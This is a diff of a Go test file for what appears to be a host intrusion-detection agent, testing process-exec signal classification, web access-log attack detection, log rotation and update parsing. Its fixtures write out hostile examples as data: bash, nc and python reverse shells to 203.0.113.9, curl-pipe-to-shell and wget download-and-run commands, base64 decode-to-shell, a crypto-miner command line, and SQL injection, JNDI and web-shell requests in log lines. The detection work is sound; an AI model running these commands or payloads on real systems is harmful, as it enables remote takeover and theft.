@@ -1,11 +1,14 @@
 package agent
 
 import (
+	"context"
+	"net"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/akquisio-dev/vigil/internal/proto"
 )
@@ -190,5 +193,150 @@ func TestSSHKeyCanaryIsValid(t *testing.T) {
 	out, err := exec.Command(bin, "-y", "-f", f).CombinedOutput()
 	if err != nil || !strings.HasPrefix(string(out), "ssh-ed25519 ") {
 		t.Fatalf("ssh-keygen rejected the key: %s %v", out, err)
+	}
+}
+
+func TestExecSignals(t *testing.T) {
+	cases := []struct {
+		e    ExecInfo
+		want string
+	}{
+		{ExecInfo{Exe: "/usr/bin/ls", Comm: "ls", Cmdline: "ls -la", ParentComm: "bash"}, ""},
+		{ExecInfo{Exe: "/usr/bin/bash", Comm: "bash", Cmdline: "bash -c npm run build", ParentComm: "node"}, ""},
+		{ExecInfo{Exe: "/usr/bin/git", Comm: "git", Cmdline: "git pull", ParentComm: "sshd"}, ""},
+		{ExecInfo{Exe: "/tmp/x", Comm: "x", Cmdline: "/tmp/x"}, "tmp_exe"},
+		{ExecInfo{Exe: "/usr/bin/kworker", Deleted: true}, "deleted_exe"},
+		{ExecInfo{Exe: "/usr/bin/bash", Comm: "bash", StdioSocket: true}, "shell_socket"},
+		{ExecInfo{Exe: "/usr/bin/dash", Comm: "sh", Cmdline: "sh -c id", ParentComm: "nginx"}, "service_shell"},
+		{ExecInfo{Exe: "/usr/bin/python3.12", Comm: "python3", Cmdline: "python3 -c x", ParentComm: "php-fpm8.3"}, "service_shell"},
+		{ExecInfo{Exe: "/usr/bin/bash", Comm: "bash", Cmdline: "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"}, "cmd_reverse_shell"},
+		{ExecInfo{Exe: "/usr/bin/nc", Comm: "nc", Cmdline: "nc -e /bin/sh 203.0.113.9 4444"}, "cmd_reverse_shell"},
+		{ExecInfo{Exe: "/usr/bin/python3", Comm: "python3", Cmdline: `python3 -c import socket,pty;s=socket.socket();s.connect(("x",1));pty.spawn("sh")`}, "cmd_reverse_shell"},
+		{ExecInfo{Exe: "/usr/bin/dash", Comm: "sh", Cmdline: "sh -c curl -fsSL http://203.0.113.9/x.sh | sh"}, "cmd_download_exec"},
+		{ExecInfo{Exe: "/usr/bin/dash", Comm: "sh", Cmdline: "sh -c wget http://x/a -O /tmp/a && chmod +x /tmp/a"}, "cmd_download_exec"},
+		{ExecInfo{Exe: "/usr/bin/dash", Comm: "sh", Cmdline: "sh -c echo aWQ= | base64 -d | sh"}, "cmd_decode_exec"},
+		{ExecInfo{Exe: "/opt/x/xmrig", Comm: "xmrig", Cmdline: "xmrig -o stratum+tcp://pool.example:3333 --donate-level 1"}, "cmd_miner"},
+	}
+	for _, c := range cases {
+		got := strings.Join(c.e.signals(), ",")
+		if c.want == "" && got != "" || c.want != "" && !strings.Contains(got, c.want) {
+			t.Errorf("%q: got %q, want %q", c.e.Cmdline+c.e.Exe, got, c.want)
+		}
+	}
+	var l procLimiter
+	now := time.Now()
+	for i := 0; i < procEventsPerMinute; i++ {
+		if ok, _ := l.allow(now); !ok {
+			t.Fatal("limit reached too early")
+		}
+	}
+	if ok, _ := l.allow(now); ok {
+		t.Fatal("limit not enforced")
+	}
+	if _, dropped := l.allow(now.Add(time.Minute)); dropped != 1 {
+		t.Fatalf("dropped: %d", dropped)
+	}
+}
+
+func TestWebLog(t *testing.T) {
+	lines := []string{
+		`203.0.113.9 - - [16/Oct/2026:11:07:24 +0000] "GET /.env HTTP/1.1" 404 178 "-" "zgrab/0.x"`,
+		`203.0.113.9 - - [16/Oct/2026:11:07:25 +0000] "GET /wp-login.php HTTP/1.1" 404 178 "-" "zgrab/0.x"`,
+		`203.0.113.9 - - [16/Oct/2026:11:07:26 +0000] "GET /.git/config HTTP/1.1" 404 178 "-" "zgrab/0.x"`,
+		`198.51.100.7 - - [16/Oct/2026:11:07:27 +0000] "GET /?id=1%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1" 200 5244 "-" "sqlmap"`,
+		`198.51.100.8 - - [16/Oct/2026:11:07:28 +0000] "GET / HTTP/1.1" 200 5244 "-" "${jndi:ldap://x/a}"`,
+		`198.51.100.9 - - [16/Oct/2026:11:07:29 +0000] "POST /uploads/wso2.php HTTP/1.1" 200 120 "-" "curl"`,
+		`192.0.2.50 - - [16/Oct/2026:11:07:30 +0000] "GET /impressum HTTP/1.1" 200 1988 "-" "Mozilla/5.0"`,
+		`garbage line`,
+	}
+	var g webAgg
+	for _, l := range lines {
+		if r, ok := parseWebLine(l, "combined"); ok {
+			g.add(r, nil)
+		}
+	}
+	for i := 0; i < 12; i++ {
+		g.add(webRequest{IP: "192.0.2.77", Method: "POST", URI: "/api/login", Status: 401}, []string{"/api/login"})
+	}
+	if r, ok := parseWebLine(`{"remote_addr":"192.0.2.1","request_method":"GET","request_uri":"/x","status":404,"http_user_agent":"a"}`, "json"); !ok || r.Status != 404 {
+		t.Fatalf("json format: %+v", r)
+	}
+	evs := g.flush("/var/log/nginx/access.log")
+	by := map[string]map[string]any{}
+	for _, e := range evs {
+		by[e.Data["ip"].(string)] = e.Data
+	}
+	if len(by) != 5 || by["192.0.2.50"] != nil {
+		t.Fatalf("notable addresses: %v", by)
+	}
+	if by["203.0.113.9"]["probes"] != 3 {
+		t.Fatalf("probes: %v", by["203.0.113.9"])
+	}
+	if k := by["198.51.100.7"]["exploit_kinds"].([]string); len(k) != 1 || k[0] != "sqli" || by["198.51.100.7"]["exploits_ok"] != 1 {
+		t.Fatalf("sqli: %v", by["198.51.100.7"])
+	}
+	if k := by["198.51.100.8"]["exploit_kinds"].([]string); len(k) != 1 || k[0] != "jndi" {
+		t.Fatalf("jndi in user agent: %v", by["198.51.100.8"])
+	}
+	if by["198.51.100.9"]["shells"] != 1 || by["192.0.2.77"]["logins"] != 12 {
+		t.Fatalf("shell or logins: %v %v", by["198.51.100.9"], by["192.0.2.77"])
+	}
+}
+
+func TestTailWebLogRotation(t *testing.T) {
+	tailPoll, webFlush = 50*time.Millisecond, 600*time.Millisecond
+	defer func() { tailPoll, webFlush = 2*time.Second, time.Minute }()
+	dir := t.TempDir()
+	path := dir + "/access.log"
+	line := func(p string) string {
+		return "203.0.113.9 - - [16/Oct/2026:11:07:24 +0000] \"GET " + p + " HTTP/1.1\" 404 1 \"-\" \"x\"\n"
+	}
+	os.WriteFile(path, []byte(line("/.env-before-start")+line("/.git/before")+line("/wp-login.php")), 0o644)
+	a := &Agent{cfg: &Config{MaxQueue: 1000}, state: &State{Offsets: map[string]LogOffset{}}, flushNow: make(chan struct{}, 1)}
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+	go a.tailWebLog(ctx, WebLog{Path: path})
+	time.Sleep(200 * time.Millisecond)
+	f, _ := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0)
+	f.WriteString(line("/.env") + line("/.git/config"))
+	f.Close()
+	time.Sleep(200 * time.Millisecond)
+	os.Rename(path, path+".1")
+	os.WriteFile(path, []byte(line("/phpmyadmin/")), 0o644)
+	time.Sleep(900 * time.Millisecond)
+	cancel()
+	a.mu.Lock()
+	defer a.mu.Unlock()
+	probes := 0
+	for _, e := range a.queue {
+		if e.Type == "web.activity" {
+			probes += e.Data["probes"].(int)
+		}
+	}
+	if probes != 3 {
+		t.Fatalf("want the 3 probes written after start (2 before and 1 after rotation), got %d", probes)
+	}
+}
+
+func TestNetKey(t *testing.T) {
+	if k := netKey(net.ParseIP("203.0.113.77")); k != "203.0.113.0/24" {
+		t.Fatal(k)
+	}
+	if k := netKey(net.ParseIP("2001:db8:1234:5678::1")); k != "2001:db8:1234::/48" {
+		t.Fatal(k)
+	}
+	if remoteWorthIt(net.ParseIP("127.0.0.1")) || !remoteWorthIt(net.ParseIP("10.90.0.1")) {
+		t.Fatal("loopback is skipped, private addresses are reported")
+	}
+}
+
+func TestUpdatesParsing(t *testing.T) {
+	out := []byte("Listing... Done\nopenssl/noble-updates,noble-security 3.0.13-0ubuntu3.5 amd64 [upgradable from: 3.0.13-0ubuntu3.4]\nvim/noble-updates 2:9.1 amd64 [upgradable from: 2:9.0]\n")
+	p := parseAptUpgradable(out)
+	if len(p) != 2 || !p[0].security || p[1].security || p[0].name != "openssl" {
+		t.Fatalf("%+v", p)
+	}
+	if !versionLess("6.8.0-45-generic", "6.8.0-147-generic") || versionLess("6.8.0-147-generic", "6.8.0-45-generic") {
+		t.Fatal("kernel versions compare numerically")
 	}
 }
